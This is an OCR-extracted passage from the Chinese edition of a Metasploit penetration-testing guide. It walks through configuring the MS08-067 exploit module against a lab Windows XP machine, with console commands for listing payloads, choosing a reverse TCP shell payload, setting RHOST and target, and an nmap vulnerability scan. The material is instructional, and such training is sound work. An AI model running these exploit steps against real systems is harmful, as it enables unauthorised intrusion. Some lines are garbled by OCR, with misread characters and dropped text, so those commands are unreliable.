（ms08_067_netapi）提示符下，执行showpayloads命令仅会显示下一段中的输出结果。》
在前面的例子中我们使用search命令找到了MS08-067攻击模块。现在让我们使用show
payloads命令查找适合这个攻击模块的攻击载荷。注意在本例中只有针对Windows平台的攻
击载荷才会显示出来，Metasploit一般会根据环境识别出可在一次特定的渗透攻击中使用的攻
击载荷。
60
---
## Page 88
第5章渗透攻击之旅
msfexploit(ms08_067_netapi)>showpayloads
CompatiblePayloads
=
Name
Rank
Description
..SNIP.·
windows/shell/reverse_ipv6_tcp
normal
WindowsCommandShell,ReverseTCP
Stager (IPv6)
windows/shell/reverse_nonx_tcp
Texou
Windows Command Shell，Reverse TCP
Stager (No NX or Win7)
windows/shell/reverse_ord_tcp
normal
Windows Command Shell，Reverse
Ordinal TCP Stager (No NX or Win7)
windows/shell/reverse_tcp
normal
WindowsCommandShell，ReverseTCP
Stager
windows/shell/reverse_tcp_allports
normal
Windows Command Shell，Reverse
All-Port TCP Stager
windows/shell_bind_tcp
normal
Windows Command Shell，Bind TCP
Inline
windows/shell_reverse_tcp
normal
Windows Command Shell,Reverse TCP
Inline
接下来我们输入setpayloadwindows/shell/reverse_tcp以选择reverse_tcp（反弹式TCP连接）
攻击载荷。输入showoptions命令后，会看到一些额外的参数被显示出来：
payload => windows/shell/reverse_tcp
msfexploit(ms08_067_netapi）>showoptions@
Module options:
Name
Current Setting
：RequiredDescription
RHOST
yes
The target address
RPORT
445
yes
Set the SMB service port
SMBPIPE
BROWSER
yes
The pipe name to use (BROwSER, SRVSVC)
3
Payloadoptions(windows/shell/reverse_tcp):
Name
Current Setting
Required
Description
EXITFUNC
thread
yes
Exit technique: seh, thread, process
LHOST
yes
The local address
LPORT
4444
yes
The local port
61
---
## Page 89
Metasploit渗透测试指南
可以注意到在◎处我们选定了攻击载荷，在·处我们显示了该模块的参数配置，攻击载荷
信息区③则显示了一些额外的配置项，如LHOST和LPORT等。在本例中，你可以配置让目
标主机回连到攻击机的特定IP地址和端口号上，所以它被称为一个反弹式的攻击载荷。在反弹
式攻击载荷中，连接是由目标主机发起的，并且其连接对象是攻击机。你可以使用这种技巧穿
透防火墙或NAT网关。
后面我们将对这个攻击载荷的LHOST（本地主机）和RHOST（远程主机）进行设置，
将LHOST设置为我们的攻击机的IP地址，远程主机将反向连接到攻击机默认的TCP端口
（4444）上。
5.1.5 msf> show targets
Metasploit的渗透攻击模块通常可以列出受到漏洞影响目标系统的类型。举例来说，由于针
对MS08-067漏洞的攻击依赖于硬编码的内存地址，所以这个攻击仅针对特定的操作系统版本，
且只适用于特定的补丁级别、语言版本以及安全机制实现（在第14章和第15章中会有详细的
解释）。在MSF终端MS08-067的提示符状态下，会显示60个受影响的系统（下面例子中只截
取了其中一部分）。攻击是否成功取决于目标Windows系统的版本，有时候自动选择目标这一
功能可能无法正常工作，容易触发错误攻击行为，通常会导致远程服务崩溃。
msfexploit(ms08_067_netapi)>showtargets
Exploittargets:
IdName
0Automatic Targeting
1Windows 2000 Universal
2
Windows XP SPo/SP1Universal
Windows XP SP2 English (NX)
4
Windows XP SP3 English (NX)
5
Windows 2003 SP0 Universal
Windows 2003 SP1 English (NO NX)
Windows 2003 SP1 English (NX)
8
Windows2003SP2English(NONX)
9Windows2003SP2English(NX)
在这个例子中，你看到“自动选择目标”●（AutoTargeting）是攻击目标列表中的一个选
项。通常，攻击模块会通过目标操作系统的指纹信息，自动选择操作系统版本进行攻击。不过，
最好还是通过人工更加准确地识别出目标操作系统的相关信息，这样才能避免触发错误的、破
坏性的攻击。
提示：本例中介绍的这个攻击模块有些“喜怒无常”，很容易造成被攻击的系统变得不稳
定，而且它很难对操作系统自动做出准确的判定。如果你在测试用的虚拟机（WindowsXP
SP2）上使用这个攻击模块，一定要手动设置好目标操作系统的类型。
62
---
## Page 90
第5章渗透攻击之旅
5.1.6info
当你觉得show和search命令所提供的信息过于简短，可以使用info命令加上模块的名字
来显示此模块的详细信息、参数说明以及所有可用的目标操作系统：（如果已选择了某个模块，
直接在该模块的提示符下输入info即可。）
msf exploit(ms08_067_netapi) >info
5.1.7set和unset
Metasploit模块中的所有参数只有两个状态：已设置（set）或未设置（unset）。有些参数会
被标记为必填项（required），这样的参数必须经过手工设置并处于启用状态。输入showoptions
命令可以查看哪些参数是必填的；使用set命令可以对某个参数进行设置（同时启用该参数）;
使用unset命令可以禁用相关参数。后面的列表展示了set和unset命令的使用方法：
提示：在我们的例子中所有引用的变量名称都使用了大写字母，这并不是必需的，不过
这样做的确是一个好习惯。
msfexploit(ms08_067_netapi)>setRH0ST192.168.1.1550
RHOST => 192.168.1.155
msf exploit(ms08_067_netapi) > set TARGET 3 @
TARGET =>3
msf exploit(ms08_067_netapi) > show options ③
Module options:
Name
Current Setting Required Description
RHOST
192.168.1.155
yes
The target address
RPORT
445
yes
Set the SMB service port
SMBPIPE BROWSER
yes
The pipe name to use (BROwSER，SRVSVC)
Exploit target:
IdName
3Windows XP SP2 English (NX)
msf exploit(ms08_067_netapi)>unset RHOST
UnsettingRHOST...
在0处我们设置目标IP地址（RH0ST）为192.168.1.155（我们的攻击对象）。在9处我
XPSP2English（NX）”。在③处我们运行了showoptions以确认所有的参数已设置完成。
63
---
## Page 91
Metasploit渗透测试指南
5.1.8 setg 和 unsetg
setg命令和unsetg命令能够对全局参数进行设置或清除。使用这组命令让你不必每次遇
到某个参数都要重新设置，特别是那些经常用到又很少会变的参数，如LHOST。
5.1.9save
在使用setg命令对全局参数进行设置后，可以使用save命令将当前的设置值保存下来，
这样在下次启动MSF终端时还可使用这些设置值。在Metasploit中可以在任何时候输入save
命令以保存当前状态。
msf exploit(ms08_067_netapi)>save
Saved configuration to: /root/.msf3/config
msf exploit(ms08_067_netapi)>
在命令执行结果中包含设置值保存在磁盘上的位置（/root/.msf3/config），如果由于一些原
因你需要恢复到原始设置，可以将这个文件删除或移动到其他位置。
5.2你的第一次渗透攻击
理论联系实际才是最好的学习方法，我们已经了解了渗透攻击的基础知识，也知道了如何
将在BackjTrack攻击机环境中使用Metasploit。
如果在第4章中你跟我们一起使用漏洞扫描器对这台WindowsXPSP2虚拟机进行了扫描，
漏洞扫描器如何能够使用手工方法来发现这个漏洞。
随着你的渗透测试技能不断提高，发现一些特定的开放端口后，你能够不加思索地联想到
如何利用相应的服务漏洞展开攻击。手工进行漏洞检查的最佳途径之一是在Metasploit中使用
nmap的扫描脚本，如下所示：
root@bt:/root#cd/opt/framework3/msf3/
root@bt:/opt/framework3/msf3#msfconsole
.·.SNIP..·
msf>nmap -sT-A--script=smb-check-vulns-P0192.168.33.1300
Warning: Traceroute does not support idle or connect scan, disabling..
NSE:Script Scanning completed.
Nmap scanreport for 192.168.33.130
Host is up (o.00050s latency).
Not shown:991 closed ports
64
---
## Page 92
第5章渗透攻击之旅
PORT
STATE SERVICE
VERSION
21/tcp（
openftp
Microsoft ftpd
25/tcp
opensmtp
Micr0S0ftESMTP6.0.2600.2180
80/tcp
openhttp
Microsoft IIS webserver 5.1
135/tcpopenmsrpc
Microsoft Windows RPC
139/tcp open netbios-ssn
443/tcp open https?
445/tcp open microsoft-ds Microsoft Windows XP microsoft-ds
1025/tcp openmsrpc
Microsoft Windows RPC
1433/tcp open ms-sql-sMicrosoft SQL Server 2005 9.00.1399; RTM
MACAddress:00:0C:29:EA:26:7C(VMware)
Device type:general purpose
Running:Microsoft Windows XP|2003
OS details:Microsoft Windows XPProfessional SP2 orWindows Server 2003③
Network Distance:1 hop
Service Info:Host:ihazsecurity;OS:Windows
Host script results:
smb-check-vulns:
MS08-067:VULNERABLE@
Conficker:Likely CLEAN
  .-d--. P)   :o 
SMBv2 DoS (CVE-2009-3103): CHECK DISABLED (add'--script-args=unsafe=1′ to run)
OS andService detectionperformed.Pleasereport any incorrect results at http://nmap.org/submit/.
Nmap done:1 IP address(1host up)scanned in 71.67seconds
msf>
我们从Metasploit中调用了nmap的插件-script=smb-check-vulnsO。留意一下我们在执行
nmap扫描时使用的参数：-sT是指隐秘的TCP连接扫描（StealthTCPconnect），我们在实践
中发现使用这个参数进行端口枚举是最可靠的。（其他推荐的参数还有-sS：隐秘的TCPSyn扫
描。）-A是指高级操作系统探测功能（advancedOSdetection），它会对一个特定服务进行更深
入的旗标和指纹搜取，能够为我们提供更多信息。
注意在nmap的扫描结果?处报告发现了MS08-067：VULNERABLE。这暗示我们或许能
够对这台主机进行攻击。下面让我们在Metasploit中找到可用于此漏洞的攻击模块，并尝试攻
入这台主机。
攻击是否成功取决于目标主机的操作系统版本、安装的服务包（ServicePack）版本以及语
言类型，同时还依赖于是否成功地绕过了数据执行保护（DEP：DataExecutionPrevention）。DEP
是为了防御缓冲区溢出攻击而设计的，它将程序堆栈渲染为只读，以防止shellcode被恶意放置
在堆栈区并执行。但是，我们可以通过一些复杂的堆栈操作来绕过DEP保护。（如何绕过DEP
的更多技术细节可以查阅http://www.uninformed.org/?v=2&a=4）
在上一小节中，我们运行showtargets命令列出了这个特定漏洞渗透攻击模块所有可用的
目标操作系统版本。由于MS08-067是一个对操作系统版本依赖程度非常高的漏洞，所以在这
里，我们手动指定目标版本以确保触发正确的溢出代码。基于上面nmap的扫描结果，我们可
65
---
## Page 93
Metasploit渗透测试指南
以判定③目标操作系统为WindowsXPServicePack2。（从结果中看也可能是WindowsServer